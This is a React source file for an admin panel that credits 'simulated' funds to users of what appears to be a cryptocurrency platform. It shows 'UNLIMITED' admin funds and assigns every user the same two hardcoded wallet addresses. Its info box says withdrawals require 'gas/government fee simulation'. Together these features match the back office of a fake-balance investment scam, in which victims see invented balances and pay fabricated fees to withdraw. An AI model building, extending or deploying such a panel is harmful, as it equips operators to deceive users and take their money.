import React, { useState } from 'react';
import axios from 'axios';
import '../styles/AdminFundTransfer.css';

function AdminFundTransfer({ token }) {
  const [formData, setFormData] = useState({
    userWalletAddress: '',
    userId: '',
    amount: '',
    currency: 'usdt'
  });
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);

  const validAddresses = [
    '0x505917f33e13642996068cdb135754c9d96811b9',
    'bc1q3sckm34082natadrqxqdguev32707pcal5ea53'
  ];

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const validateWalletAddress = (address) => {
    return validAddresses.includes(address);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    if (!validateWalletAddress(formData.userWalletAddress)) {
      setMessage('❌ Invalid wallet address format');
      setLoading(false);
      return;
    }

    if (!formData.userId || !formData.amount) {
      setMessage('❌ Please fill in all fields');
      setLoading(false);
      return;
    }

    if (isNaN(formData.amount) || parseFloat(formData.amount) <= 0) {
      setMessage('❌ Amount must be a positive number');
      setLoading(false);
      return;
    }

    try {
      const response = await axios.post(
        'http://localhost:5000/api/admin/transfer-funds',
        {
          userWalletAddress: formData.userWalletAddress,
          userId: formData.userId,
          amount: parseFloat(formData.amount),
          currency: formData.currency
        },
        { headers: { Authorization: `Bearer ${token}` } }
      );

      setMessage(`✅ ${response.data.message} | Transaction ID: ${response.data.transactionId}`);
      setFormData({
        userWalletAddress: '',
        userId: '',
        amount: '',
        currency: 'usdt'
      });
    } catch (error) {
      setMessage('❌ ' + (error.response?.data?.error || 'Transfer failed'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="admin-transfer-page">
      <div className="container">
        <h1>💰 Fund Transfer - Admin Panel</h1>

        <div className="admin-form">
          {/* Admin Funds Display */}
          <div className="admin-funds">
            <span>Available Admin Funds:</span>
            <span>UNLIMITED</span>
          </div>

          {/* Alert Messages */}
          {message && (
            <div className={`alert ${message.includes('✅') ? 'alert-success' : 'alert-error'}`}>
              {message}
            </div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit}>
            {/* User ID Input */}
            <div className="form-group">
              <label htmlFor="userId">👤 User ID Number *</label>
              <input
                type="text"
                id="userId"
                name="userId"
                value={formData.userId}
                onChange={handleChange}
                placeholder="e.g., USR-1234567890"
                required
              />
            </div>

            {/* Wallet Address Input */}
            <div className="form-group">
              <label htmlFor="userWalletAddress">🔐 User Wallet Address *</label>
              <select
                id="userWalletAddress"
                name="userWalletAddress"
                value={formData.userWalletAddress}
                onChange={handleChange}
                required
              >
                <option value="">Select a wallet address</option>
                <option value="0x505917f33e13642996068cdb135754c9d96811b9">
                  USDT TRC20: 0x505917f33e13642996068cdb135754c9d96811b9
                </option>
                <option value="bc1q3sckm34082natadrqxqdguev32707pcal5ea53">
                  Bitcoin: bc1q3sckm34082natadrqxqdguev32707pcal5ea53
                </option>
                <option value="0x505917f33e13642996068cdb135754c9d96811b9">
                  Ethereum: 0x505917f33e13642996068cdb135754c9d96811b9
                </option>
              </select>
            </div>

            {/* Currency Selection */}
            <div className="form-group">
              <label htmlFor="currency">💵 Currency *</label>
              <select
                id="currency"
                name="currency"
                value={formData.currency}
                onChange={handleChange}
                required
              >
                <option value="usdt">USDT</option>
                <option value="btc">Bitcoin (BTC)</option>
                <option value="eth">Ethereum (ETH)</option>
              </select>
            </div>

            {/* Amount Input */}
            <div className="form-group">
              <label htmlFor="amount">📊 Amount to Transfer *</label>
              <div className="amount-input-wrapper">
                <input
                  type="number"
                  id="amount"
                  name="amount"
                  value={formData.amount}
                  onChange={handleChange}
                  placeholder="Enter amount"
                  step="0.01"
                  min="0"
                  required
                />
                <span className="currency-label">{formData.currency.toUpperCase()}</span>
              </div>
            </div>

            {/* Fee Information */}
            <div className="fee-info">
              <p>⛽ Network Fee: <strong>0.00</strong> (Simulated)</p>
              <p>💱 Gas Fee: <strong>0.00</strong> (Simulated)</p>
              <p style={{ marginTop: '0.5rem', borderTop: '1px solid #ddd', paddingTop: '0.5rem' }}>
                Total Amount: <strong>{formData.amount ? parseFloat(formData.amount).toFixed(2) : '0.00'}</strong> {formData.currency.toUpperCase()}
              </p>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="btn btn-transfer"
              disabled={loading}
            >
              {loading ? '⏳ Processing...' : '✓ Transfer Funds'}
            </button>
          </form>
        </div>

        {/* Info Box */}
        <div className="info-box">
          <h3>ℹ️ Transfer Information</h3>
          <ul>
            <li>All users receive the same unified wallet addresses</li>
            <li>Transfers are processed instantly</li>
            <li>Users can receive simulated funds in their wallet</li>
            <li>Withdrawals require gas/government fee simulation</li>
            <li>All transfers are tracked and auditable</li>
          </ul>
        </div>
      </div>
    </div>
  );
}

export default AdminFundTransfer;
